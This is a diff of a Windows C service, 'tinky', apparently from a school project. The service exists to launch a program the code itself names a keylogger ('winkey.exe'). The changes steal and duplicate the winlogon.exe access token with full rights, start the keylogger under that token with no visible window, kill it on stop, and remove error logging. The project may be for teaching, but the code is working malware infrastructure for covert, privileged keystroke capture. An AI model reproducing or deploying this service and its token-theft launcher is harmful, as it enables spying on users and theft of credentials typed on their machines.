@@ -16,11 +16,11 @@
 #include <strsafe.h>
 #include <tlhelp32.h>
 
-// Path to the executable file that the service will manage.
-#define WINKEY_PATH "C:\\Users\\rever\\source\\repos\\sdummett-at-42\\tinky-winkey\\winkey.exe"
-
 // Name of the service used for registration and control.
 #define SVC_NAME "tinky"
+
+// Name of the keylogger executable that the service will manage.
+#define KEYLOGGER_NAME "winkey.exe"
 
 // Event log identifier for reporting service errors.
 #define SVC_ERROR 1
@@ -38,15 +38,14 @@ HANDLE                  g_svc_stop_event = NULL;
 HANDLE                  g_process = NULL; // Global handle for the process
 
 static VOID WINAPI svc_ctrl_handler(DWORD);
-static VOID WINAPI svc_main(DWORD, LPTSTR*);
-
 static VOID report_svc_status(DWORD, DWORD, DWORD);
-static VOID svc_init(DWORD, LPTSTR*);
-static VOID svc_report_event(LPTSTR);
-static void print_error(const char* msg);
+static HANDLE get_winlogon_duptoken(void);
 
 static VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
 {
+    if (argc <= 1)
+        return;
+
     // Register the handler function for the service.
     // This function connects the service to the SCM (Service Control Manager).
     // 'svc_ctrl_handler' is the function that will handle control requests (e.g., stop, pause).
@@ -55,13 +54,8 @@ static VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
         svc_ctrl_handler);
 
     // Check if the registration of the control handler failed.
-    // If it fails, report an error event and exit the function.
     if (!g_svc_status_handle)
-    {
-        print_error("Failed to register service control handler");
-        svc_report_event(TEXT("RegisterServiceCtrlHandler"));
         return;
-    }
 
     // Initialize the SERVICE_STATUS structure members that will remain constant.
     // 'dwServiceType' indicates the type of service (here, it's a service running in its own process).
@@ -74,68 +68,68 @@ static VOID WINAPI svc_main(DWORD argc, LPTSTR* argv)
     // A delay of 3000 milliseconds is provided for the start-up process.
     report_svc_status(SERVICE_START_PENDING, NO_ERROR, 3000);
 
-    // Perform service-specific initialization and start the service's main work.
-    // This function will include the core logic required for the service to operate.
-    svc_init(argc, argv);
-}
+    // Create an event for service stop notification.
+    // 'CreateEvent()' sets up a manual-reset event which will be signaled when the service should stop.
+    g_svc_stop_event = CreateEvent(
+        NULL,    // Default security attributes
+        TRUE,    // Manual reset event
+        FALSE,   // Initial state is non-signaled
+        NULL);   // No name
 
-static void start_process(LPCTSTR lpApplicationName)
-{
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-
-    // Initialize the STARTUPINFO structure with zeros and set its size.
-    // This structure is used to specify window settings and other options for the process being created.
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
-
-    // Create the new process.
-    // 'CreateProcess' launches the executable specified by 'lpApplicationName'.
-    // It provides information about how the process should be started and managed.
-    if (!CreateProcess(lpApplicationName,   // Name of the executable file
-        NULL,                // Command line parameters (NULL for default)
-        NULL,                // Process security attributes (NULL for default)
-        NULL,                // Thread security attributes (NULL for default)
-        FALSE,               // Do not inherit handles
-        0,                   // Default creation flags
-        NULL,                // Use the current environment (NULL for default)
-        NULL,                // Use the current directory (NULL for default)
-        &si,                 // Pointer to STARTUPINFO structure
-        &pi))                // Pointer to PROCESS_INFORMATION structure
+    // Check if the event creation failed.
+    // If creation fails, report service status as stopped.
+    if (g_svc_stop_event == NULL)
     {
-        // If process creation fails, report the error.
-        print_error("Failed to create process");
+        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
         return;
     }
 
-    // Store the handle of the newly created process globally for future use.
-    // This handle can be used to manage or terminate the process.
-    g_process = pi.hProcess;
+    // Report service status as running once initialization is complete.
+    // This informs the Service Control Manager that the service is now active.
+    report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);
 
-    // Close the handle to the thread. This handle is no longer needed after process creation.
-    CloseHandle(pi.hThread);
-}
-
-static void stop_process(void)
-{
-    // Check if there is a valid process handle.
-    // 'g_process' should be non-NULL if a process is currently running.
-    if (g_process != NULL)
+    // Attempt to impersonate the winlogon.exe process.
+    // 'impersonate_winlogon()' is used to gain the security context of the winlogon process.
+    HANDLE dup_token = get_winlogon_duptoken();
+    if (!dup_token)
     {
-        // Terminate the process using its handle.
-        // 'TerminateProcess' forcefully stops the process and can be used to stop the process immediately.
-        // The exit code '0' is passed, which is a conventional value indicating normal termination.
-        TerminateProcess(g_process, 0);
-
-        // Close the handle to the process.
-        // After termination, the handle is no longer needed and should be closed to avoid resource leaks.
-        CloseHandle(g_process);
-
-        // Set the global process handle to NULL.
-        // This indicates that there is no longer an active process handle.
-        g_process = NULL;
+        // Report service status as stopped if impersonation fails.
+        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
+        return;
     }
+
+    STARTUPINFO info = { sizeof(info) };
+    PROCESS_INFORMATION proc_info = { 0 };
+
+    // Attempt to create a new process using the duplicated token, without showing a window.
+    if (!CreateProcessAsUser(dup_token,     // Handle to the duplicated token (used for impersonation)
+        NULL,          // Application name (NULL if part of command line)
+        argv[1],       // Command line (argv[1] contains the executable path)
+        NULL,          // Process security attributes (NULL for default)
+        NULL,          // Thread security attributes (NULL for default)
+        FALSE,         // Inherit handles flag (FALSE to not inherit)
+        CREATE_NO_WINDOW, // Creation flags (CREATE_NO_WINDOW to run without a console window)
+        NULL,          // Environment (NULL to use the parent process's environment)
+        NULL,          // Current directory (NULL to use the parent process's directory)
+        &info,         // Pointer to STARTUPINFO structure
+        &proc_info))   // Pointer to PROCESS_INFORMATION structure
+    {
+        return;
+    }
+    CloseHandle(dup_token);
+
+    // Wait indefinitely until the stop event is signaled.
+    // The service will continue to run until the stop event is set.
+    //WaitForSingleObject(g_svc_stop_event, INFINITE);
+    WaitForSingleObject(proc_info.hProcess, INFINITE);
+    CloseHandle(proc_info.hProcess);
+    CloseHandle(proc_info.hThread);
+    CloseHandle(g_svc_stop_event);
+
+    // Report service status as stopped when the stop event is signaled.
+    // This indicates that the service has stopped successfully.
+    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
+    return;
 }
 
 static BOOL get_winlogon_pid(DWORD* pProcessId)
@@ -178,111 +172,46 @@ static BOOL get_winlogon_pid(DWORD* pProcessId)
     return FALSE;
 }
 
-static BOOL impersonate_winlogon(void)
+static HANDLE get_winlogon_duptoken(void)
 {
     DWORD winlogon_pid = 0;
 
     // Retrieve the process ID of winlogon.exe.
     // 'get_winlogon_pid' is used to find the process ID.
     if (!get_winlogon_pid(&winlogon_pid))
-        return FALSE;
+        return NULL;
 
     // Open the winlogon process with PROCESS_QUERY_INFORMATION access.
     // 'OpenProcess' is used to obtain a handle to the winlogon process.
     HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogon_pid);
     if (process == NULL) {
-        print_error("Failed to open winlogon process");
-        return FALSE;
+        return NULL;
     }
 
     // Open the access token associated with the winlogon process.
     // 'OpenProcessToken' is used to get the token for the process.
     HANDLE token;
-    if (!OpenProcessToken(process, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &token))
+    if (!OpenProcessToken(process, TOKEN_ALL_ACCESS, &token))
     {
-        print_error("Failed to open process token");
         CloseHandle(process);
-        return FALSE;
+        return NULL;
     }
 
     // Duplicate the token to create a primary token with necessary privileges.
     // 'DuplicateTokenEx' creates a new token with the desired access level.
     HANDLE dup_token;
-    if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dup_token))
+    if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup_token))
     {
-        print_error("Failed to duplicate token");
         CloseHandle(token);
         CloseHandle(process);
-        return FALSE;
-    }
-
-    // Impersonate the logged-on user using the duplicated token.
-    // 'ImpersonateLoggedOnUser' sets the security context to the user represented by the token.
-    if (!ImpersonateLoggedOnUser(dup_token))
-    {
-        // Clean up handles if impersonation fails.
-        print_error("Failed to impersonate logged-on user");
-        CloseHandle(dup_token);
-        CloseHandle(token);
-        CloseHandle(process);
-        return FALSE;
+        return NULL;
     }
 
     // Close the handles after successful impersonation.
     // These handles are no longer needed after impersonation.
-    CloseHandle(dup_token);
     CloseHandle(token);
     CloseHandle(process);
-    return TRUE;
-}
-
-static VOID svc_init(DWORD argc, LPTSTR* argv)
-{
-    (void)argc, (void)argv;
-    // TODO: Declare and initialize any necessary variables.
-    // Periodically call 'report_svc_status()' with SERVICE_START_PENDING during initialization.
-    // If initialization fails, call 'report_svc_status()' with SERVICE_STOPPED.
-
-    // Attempt to impersonate the winlogon.exe process.
-    // 'impersonate_winlogon()' is used to gain the security context of the winlogon process.
-    if (!impersonate_winlogon())
-    {
-        // Report service status as stopped if impersonation fails.
-        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
-        return;
-    }
-
-    // Create an event for service stop notification.
-    // 'CreateEvent()' sets up a manual-reset event which will be signaled when the service should stop.
-    g_svc_stop_event = CreateEvent(
-        NULL,    // Default security attributes
-        TRUE,    // Manual reset event
-        FALSE,   // Initial state is non-signaled
-        NULL);   // No name
-
-    // Check if the event creation failed.
-    // If creation fails, report service status as stopped.
-    if (g_svc_stop_event == NULL)
-    {
-        report_svc_status(SERVICE_STOPPED, GetLastError(), 0);
-        return;
-    }
-
-    // Report service status as running once initialization is complete.
-    // This informs the Service Control Manager that the service is now active.
-    report_svc_status(SERVICE_RUNNING, NO_ERROR, 0);
-
-    // Start the process with the specified executable path.
-    // 'start_process()' is used to launch the process.
-    start_process(WINKEY_PATH);
-
-    // Wait indefinitely until the stop event is signaled.
-    // The service will continue to run until the stop event is set.
-    WaitForSingleObject(g_svc_stop_event, INFINITE);
-
-    // Report service status as stopped when the stop event is signaled.
-    // This indicates that the service has stopped successfully.
-    report_svc_status(SERVICE_STOPPED, NO_ERROR, 0);
+    return dup_token;
 }
 
 static VOID report_svc_status(DWORD current_state,
@@ -295,7 +224,6 @@ static VOID report_svc_status(DWORD current_state,
     // 'current_state' specifies the current state of the service (e.g., running, stopped).
     // 'win32_exit_code' provides the error code if the service fails.
     // 'wait_hint' is a hint to the SCM on how long to wait before checking the status again.
-
     g_svc_status.dwCurrentState = current_state;
     g_svc_status.dwWin32ExitCode = win32_exit_code;
     g_svc_status.dwWaitHint = wait_hint;
@@ -322,18 +250,64 @@ static VOID report_svc_status(DWORD current_state,
     SetServiceStatus(g_svc_status_handle, &g_svc_status);
 }
 
+static void kill_winkey_process(void)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32 pe32;
+    DWORD dwDesiredProcessId = 0;
+
+    // Take a snapshot of all running processes
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    // Initialize the PROCESSENTRY32 structure
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // Retrieve the first process from the snapshot
+    if (!Process32First(hProcessSnap, &pe32)) {
+        CloseHandle(hProcessSnap);
+        return;
+    }
+
+    // Iterate through the list of processes
+    do {
+        if (strcmp(pe32.szExeFile, "winkey.exe") == 0) {
+            dwDesiredProcessId = pe32.th32ProcessID;
+            break;
+        }
+    } while (Process32Next(hProcessSnap, &pe32));
+
+    // Close the process snapshot handle
+    CloseHandle(hProcessSnap);
+
+    if (dwDesiredProcessId != 0) {
+        // Open the process with the necessary rights to terminate it
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwDesiredProcessId);
+        if (hProcess == NULL) {
+            return;
+        }
+
+        // Terminate the process
+        TerminateProcess(hProcess, 0);
+
+        // Close the process handle
+        CloseHandle(hProcess);
+    }
+}
+
 static VOID WINAPI svc_ctrl_handler(DWORD ctrl)
 {
     // Handle the requested control code sent by the Service Control Manager.
-
     switch (ctrl)
     {
     case SERVICE_CONTROL_STOP:
         // Report that the service is in the process of stopping.
         report_svc_status(SERVICE_STOP_PENDING, NO_ERROR, 0);
 
-        // Stop the running process associated with the service.
-        stop_process();
+		// Kill the keylogger process before stopping the service.
+        kill_winkey_process();
 
         // Signal the service to stop by setting the stop event.
         // This will cause the service to exit its main loop.
@@ -353,40 +327,6 @@ static VOID WINAPI svc_ctrl_handler(DWORD ctrl)
         // Handle other control codes as needed.
         // By default, do nothing for unhandled control codes.
         break;
-    }
-}
-
-static VOID svc_report_event(LPTSTR function)
-{
-    HANDLE event_source;
-    LPCTSTR strings[2];
-    TCHAR buffer[80];
-
-    // Register the service as an event source to write to the event log.
-    event_source = RegisterEventSource(NULL, SVC_NAME);
-
-    if (event_source != NULL)
-    {
-        // Format the error message with the function name and error code.
-        StringCchPrintf(buffer, 80, TEXT("%s failed with %d"), function, GetLastError());
-
-        // Prepare the array of strings to log.
-        strings[0] = SVC_NAME;   // Service name
-        strings[1] = buffer;     // Error message
-
-        // Report the error event to the event log.
-        ReportEvent(event_source,  // Event log handle
-            EVENTLOG_ERROR_TYPE,    // Event type (error)
-            0,                     // Event category (not used)
-            SVC_ERROR,             // Event identifier (custom identifier)
-            NULL,                  // No security identifier
-            2,                     // Number of strings in the array
-            0,                     // No binary data
-            strings,               // Array of strings to log
-            NULL);                 // No binary data
-
-        // Unregister the event source to clean up.
-        DeregisterEventSource(event_source);
     }
 }
 
@@ -418,7 +358,7 @@ static void print_error(const char* msg)
     }
 }
 
-static void install_service(void)
+static void install_service(SC_HANDLE scm)
 {
     TCHAR unquoted_path[MAX_PATH];
 
@@ -434,13 +374,6 @@ static void install_service(void)
     // "\"d:\\my share\\myservice.exe\"".
     TCHAR path[MAX_PATH];
     StringCbPrintf(path, MAX_PATH, TEXT("\"%s\""), unquoted_path);
-
-    // Open a handle to the Service Control Manager with the ability to create services.
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (scm == NULL) {
-        print_error("Failed to open service manager");
-        return;
-    }
 
     // Create the service using the Service Control Manager handle.
     SC_HANDLE service = CreateService(
@@ -473,190 +406,8 @@ static void install_service(void)
     CloseServiceHandle(scm);
 }
 
-static void wait_status_stopped(SC_HANDLE service, SC_HANDLE scm)
+static void start_service(SC_HANDLE scm)
 {
-    // Structure to hold the service status information.
-    SERVICE_STATUS_PROCESS status;
-    DWORD old_checkpoint;
-    DWORD start_tick_count;
-    DWORD wait_time;
-    DWORD bytes_needed;
-
-    // Query the current status of the service.
-    // This retrieves information about the service's current state.
-    if (!QueryServiceStatusEx(
-        service,                        // Handle to the service
-        SC_STATUS_PROCESS_INFO,         // Information level to query
-        (LPBYTE)&status,                // Pointer to the SERVICE_STATUS_PROCESS structure
-        sizeof(SERVICE_STATUS_PROCESS), // Size of the structure
-        &bytes_needed))                 // Bytes needed if the buffer is too small
-    {
-        print_error("Failed to query service status");
-        CloseServiceHandle(service);
-        CloseServiceHandle(scm);
-        return;
-    }
-
-    // If the service is already running or pending to stop, return.
-    // We do not attempt to start the service if it is not in a stoppable state.
-    if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING)
-    {
-        printf("Cannot start the service because it is already running\n");
-        CloseServiceHandle(service);
-        CloseServiceHandle(scm);
-        return;
-    }
-
-    // Record the starting tick count and checkpoint value.
-    start_tick_count = GetTickCount();
-    old_checkpoint = status.dwCheckPoint;
-
-    // Wait for the service to stop. Loop until the service state is no longer "STOP_PENDING".
-    while (status.dwCurrentState == SERVICE_STOP_PENDING)
-    {
-        // Calculate wait time. Wait time is a fraction of the wait hint but constrained between 1 and 10 seconds.
-        wait_time = status.dwWaitHint / 10;
-
-        if (wait_time < 1000)
-            wait_time = 1000;
-        else if (wait_time > 10000)
-            wait_time = 10000;
-
-        Sleep(wait_time);
-
-        // Check the status of the service again.
-        if (!QueryServiceStatusEx(
-            service,                     // Handle to the service
-            SC_STATUS_PROCESS_INFO,     // Information level to query
-            (LPBYTE)&status,             // Pointer to the SERVICE_STATUS_PROCESS structure
-            sizeof(SERVICE_STATUS_PROCESS), // Size of the structure
-            &bytes_needed))              // Bytes needed if the buffer is too small
-        {
-            print_error("Failed to query service status");
-            CloseServiceHandle(service);
-            CloseServiceHandle(scm);
-            return;
-        }
-
-        // If the checkpoint has increased, reset the start tick count.
-        // This indicates that progress is being made.
-        if (status.dwCheckPoint > old_checkpoint)
-        {
-            start_tick_count = GetTickCount();
-            old_checkpoint = status.dwCheckPoint;
-        }
-        else
-        {
-            // Check if the timeout period has elapsed.
-            // If so, report a timeout error and exit.
-            if (GetTickCount() - start_tick_count > status.dwWaitHint)
-            {
-                printf("Timeout waiting for service to stop\n");
-                CloseServiceHandle(service);
-                CloseServiceHandle(scm);
-                return;
-            }
-        }
-    }
-}
-
-static void wait_status_pending(SC_HANDLE service, SC_HANDLE scm)
-{
-    // Structure to hold service status information.
-    SERVICE_STATUS_PROCESS status;
-    DWORD old_checkpoint;
-    DWORD start_tick_count;
-    DWORD wait_time;
-    DWORD bytes_needed;
-
-    // Query the status of the service.
-    // Retrieves current status information about the specified service.
-    if (!QueryServiceStatusEx(
-        service,                        // Handle to the service
-        SC_STATUS_PROCESS_INFO,         // Information level to query
-        (LPBYTE)&status,                // Pointer to the SERVICE_STATUS_PROCESS structure
-        sizeof(SERVICE_STATUS_PROCESS), // Size of the structure
-        &bytes_needed))                 // Bytes needed if the buffer is too small
-    {
-        print_error("Failed to query service status");
-        CloseServiceHandle(service);
-        CloseServiceHandle(scm);
-        return;
-    }
-
-    // Record the start time and initial checkpoint value.
-    start_tick_count = GetTickCount();
-    old_checkpoint = status.dwCheckPoint;
-
-    // Loop while the service is in the "START_PENDING" state.
-    while (status.dwCurrentState == SERVICE_START_PENDING)
-    {
-        // Calculate wait time. Wait no longer than the wait hint, constrained between 1 and 10 seconds.
-        wait_time = status.dwWaitHint / 10;
-
-        if (wait_time < 1000)
-            wait_time = 1000;
-        else if (wait_time > 10000)
-            wait_time = 10000;
-
-        Sleep(wait_time);
-
-        // Query the status of the service again.
-        if (!QueryServiceStatusEx(
-            service,                     // Handle to the service
-            SC_STATUS_PROCESS_INFO,     // Information level to query
-            (LPBYTE)&status,             // Pointer to the SERVICE_STATUS_PROCESS structure
-            sizeof(SERVICE_STATUS_PROCESS), // Size of the structure
-            &bytes_needed))              // Bytes needed if the buffer is too small
-        {
-            print_error("Failed to query service status");
-            break;
-        }
-
-        // If the checkpoint value has increased, reset the start time.
-        // Indicates that the service is making progress.
-        if (status.dwCheckPoint > old_checkpoint)
-        {
-            start_tick_count = GetTickCount();
-            old_checkpoint = status.dwCheckPoint;
-        }
-        else
-        {
-            // If no progress is made within the wait hint period, break out of the loop.
-            if (GetTickCount() - start_tick_count > status.dwWaitHint)
-            {
-                // No progress within the wait hint.
-                break;
-            }
-        }
-    }
-
-    // Check if the service is running.
-    // Report the final status of the service after waiting.
-    if (status.dwCurrentState == SERVICE_RUNNING)
-    {
-        printf("Service started successfully.\n");
-    }
-    else
-    {
-        printf("Service not started.\n");
-        printf("  Current State: %ld\n", status.dwCurrentState);
-        printf("  Exit Code: %ld\n", status.dwWin32ExitCode);
-        printf("  Check Point: %ld\n", status.dwCheckPoint);
-        printf("  Wait Hint: %ld\n", status.dwWaitHint);
-    }
-}
-
-static void start_service(void)
-{
-    // Open a handle to the Service Control Manager (SCM) with full access rights.
-    // The SCM manages the services on the local machine.
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (scm == NULL) {
-        print_error("Failed to open service manager");
-        return;
-    }
-
     // Open a handle to the specified service with full access rights.
     // This handle is used to interact with the service (e.g., start, stop).
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
@@ -666,38 +417,35 @@ static void start_service(void)
         return;
     }
 
-    // Ensure the service is not already running before attempting to start it.
-    // Waits until the service is confirmed to be stopped.
-    wait_status_stopped(service, scm);
+    char keylogger_path[MAX_PATH] = { 0 };
+    GetModuleFileName(NULL, keylogger_path, MAX_PATH);
+
+    // Find the last backslash in the path to isolate the directory portion.
+    char* last_backslash = strrchr(keylogger_path, '\\');
+    if (last_backslash) {
+        *last_backslash = '\0';
+    }
+
+    // Construct the full path to winkey.exe by appending its name to the directory path.
+    snprintf(keylogger_path, MAX_PATH, "%s\\" KEYLOGGER_NAME, keylogger_path);
 
     // Attempt to start the service.
     // The function StartService does not return until the service is either running or in a start-pending state.
-    if (!StartService(service, 0, NULL)) {
+    const char* args[] = { keylogger_path };
+    if (!StartService(service, 1, args)) {
         print_error("Failed to start service");
     }
     else {
-        printf("Service start pending...\n");
+        printf("Service started succesfully\n");
     }
-
-    // Wait for the service to be fully started.
-    // This function will block until the service status indicates that it is running or fails to start.
-    wait_status_pending(service, scm);
 
     // Close the handles to the service and SCM once operations are complete.
     CloseServiceHandle(service);
     CloseServiceHandle(scm);
 }
 
-static void stop_service(void)
+static void stop_service(SC_HANDLE scm)
 {
-    // Open a handle to the Service Control Manager (SCM) with connect rights.
-    // The SCM manages the services on the local machine.
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-    if (scm == NULL) {
-        print_error("Failed to open service manager");
-        return;
-    }
-
     // Open a handle to the specified service with stop rights.
     // This handle is used to interact with the service (specifically, to stop it).
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_STOP);
@@ -745,17 +493,8 @@ static BOOL is_service_running(SC_HANDLE service)
     return (ssp.dwCurrentState == SERVICE_RUNNING);
 }
 
-static void delete_service(void)
+static void delete_service(SC_HANDLE scm)
 {
-    // Open a handle to the Service Control Manager with the ability to create services.
-    // This handle is necessary to interact with the service for deletion.
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (scm == NULL) {
-        // Log an error if opening the service manager fails.
-        print_error("Failed to open service manager");
-        return;
-    }
-
     // Open a handle to the specified service with all access rights.
     // This handle is used to delete the service.
     SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
@@ -769,7 +508,7 @@ static void delete_service(void)
     // Check if the service is currently running.
     // If it is, stop the service before attempting to delete it.
     if (is_service_running(service)) {
-        stop_service();
+        stop_service(scm);
     }
 
     // Attempt to delete the service.
@@ -798,28 +537,31 @@ int main(int argc, char* argv[])
         };
 
         // Start the service control dispatcher. This function blocks until the service stops.
-        // If it fails, log the error and report the event.
-        if (!StartServiceCtrlDispatcher(dispatch_table))
-        {
-            print_error("Failed StartServiceCtrlDispatcher");  // Log error if dispatcher fails
-            svc_report_event(TEXT("StartServiceCtrlDispatcher"));  // Report the error to the event log
-        }
+        StartServiceCtrlDispatcher(dispatch_table);
         return 0;  // Exit the program after the service stops
+    }
+
+    // Open a handle to the Service Control Manager (SCM) with full access rights.
+    // The SCM manages the services on the local machine.
+    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (scm == NULL) {
+        print_error("Failed to open service manager");
+        return;
     }
 
     // Command-line arguments are present, indicating a service management operation.
     // Perform the appropriate operation based on the argument provided.
     if (strcmp(argv[1], "install") == 0) {
-        install_service();  // Install the service
+        install_service(scm);  // Install the service
     }
     else if (strcmp(argv[1], "start") == 0) {
-        start_service();  // Start the service
+        start_service(scm);  // Start the service
     }
     else if (strcmp(argv[1], "stop") == 0) {
-        stop_service();  // Stop the service
+        stop_service(scm);  // Stop the service
     }
     else if (strcmp(argv[1], "delete") == 0) {
-        delete_service();  // Delete the service
+        delete_service(scm);  // Delete the service
     }
     else {
         // If the argument is invalid, print the usage message and return an error code.
